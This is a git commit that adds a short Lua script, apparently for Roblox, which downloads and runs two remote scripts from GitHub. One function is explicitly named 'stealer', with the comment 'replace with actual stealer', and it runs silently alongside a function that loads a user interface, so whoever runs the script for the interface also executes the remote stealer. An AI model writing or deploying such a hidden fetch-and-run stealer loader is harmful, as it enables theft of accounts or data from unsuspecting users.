51ab4afd164bafd4fc9564520a68491aef077b6b
TakZ-bit <tak72086@gmail.com>
2026-08-02 05:21:09 +0630

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,8 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/TakZ-bit/sturdy-fortnight/refs/heads/main/Bbil.lua'))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Doortthemort/676/refs/heads/main/Main.lua.lua"))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
